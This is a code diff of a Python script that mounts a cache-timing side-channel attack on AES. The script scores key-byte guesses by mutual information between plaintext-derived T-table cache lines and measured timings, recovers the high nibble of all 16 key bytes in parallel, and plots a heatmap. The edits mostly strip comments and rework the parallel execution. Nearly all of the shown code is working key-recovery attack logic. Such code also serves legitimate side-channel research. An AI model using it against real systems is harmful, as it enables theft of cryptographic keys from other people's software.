@@ -38,14 +38,15 @@ def load_data(filename):
         for line in f:
             parts = line.strip().split()
             if len(parts) < 66:
-                continue  # skip malformed line
+                continue
             pt = [int(parts[0][i:i + 2], 16) for i in range(0, 32, 2)]
             times = list(map(int, parts[2:]))
             if len(times) != 64:
-                continue  # skip incomplete measurement
+                continue
             plaintexts.append(pt)
             timings.append(times)
     return np.array(plaintexts, dtype=np.uint8), np.array(timings, dtype=np.float32)
+
 
 def filter_outliers(pts, timings, z_thresh=3.0):
     """Remove samples where any timing value is too far from mean (z-score filter)."""
@@ -62,16 +63,16 @@ def score_byte(idx, pts, timings):
     """Score key guesses for a single AES byte using MI and cache line timing."""
     print(f"[INFO] Processing byte {idx}")
     pt_byte = pts[:, idx]
-    t_idx = idx % 4  # map byte to corresponding T-table
+    t_idx = idx % 4
     relevant_timings = timings[:, t_idx * 16:(t_idx + 1) * 16]
-    mi_matrix = np.zeros((256, 16))
+    mi_matrix = np.zeros((256, 16), dtype=np.float32)
 
     for k in range(256):
         predicted = np.bitwise_xor(pt_byte, k) // 16
         for line in range(16):
             mask = (predicted == line).astype(int)
             if mask.sum() == 0 or mask.sum() == len(mask):
-                continue  # degenerate mask
+                continue
             mi = compute_mi(mask, relevant_timings[:, line])
             mi_matrix[k, line] = mi
 
@@ -80,17 +81,19 @@ def score_byte(idx, pts, timings):
     best = top5[0]
     conf = (scores[top5[0]] - scores[top5[1]]) / scores[top5[0]] if scores[top5[0]] != 0 else 0
     top_guesses = [(int(k), float(scores[k])) for k in top5]
-    return idx, best, scores[best], conf, mi_matrix, top_guesses
+
+    return (idx, best, scores[best], conf, mi_matrix, top_guesses)
 
 def recover_all(pts, timings, procs):
     """Run CPA (MI-based) for all 16 AES key bytes in parallel using joblib with proper progress tracking."""
-    tasks = (delayed(score_byte)(i, pts, timings) for i in range(16))
-    results = []
-    with Parallel(n_jobs=procs, backend="loky") as parallel:
-        for result in tqdm(parallel(tasks), total=16, desc="Recovering key (true progress)"):
-            results.append(result)
+    tasks = [delayed(score_byte)(i, pts, timings) for i in range(16)]
+    print("[DEBUG] Launching parallel jobs...")
+    results = Parallel(n_jobs=min(procs, 16), backend="loky")(tasks)
 
+    print("[DEBUG] All byte results received.")
+    results = list(tqdm(results, total=16, desc="Aggregating results"))
     results.sort(key=lambda x: x[0])
+
     key = bytes((r[1] & 0xF0) for r in results)
     confidences = [r[3] for r in results]
     matrices = {r[0]: r[4] for r in results}
@@ -119,7 +122,7 @@ def plot_combined_heatmap(matrices, out_path):
     collapsed = np.zeros((16, 16))
     for i in range(16):
         for hn in range(16):
-            collapsed[i, hn] = np.max(matrices[i][hn*16:(hn+1)*16])
+            collapsed[i, hn] = np.max(matrices[i][hn * 16:(hn + 1) * 16])
     plt.figure(figsize=(14, 6))
     sns.heatmap(collapsed, annot=False, xticklabels=[f"0x{hn << 4:02x}" for hn in range(16)],
                 yticklabels=[f"B{i}" for i in range(16)], cmap="plasma")
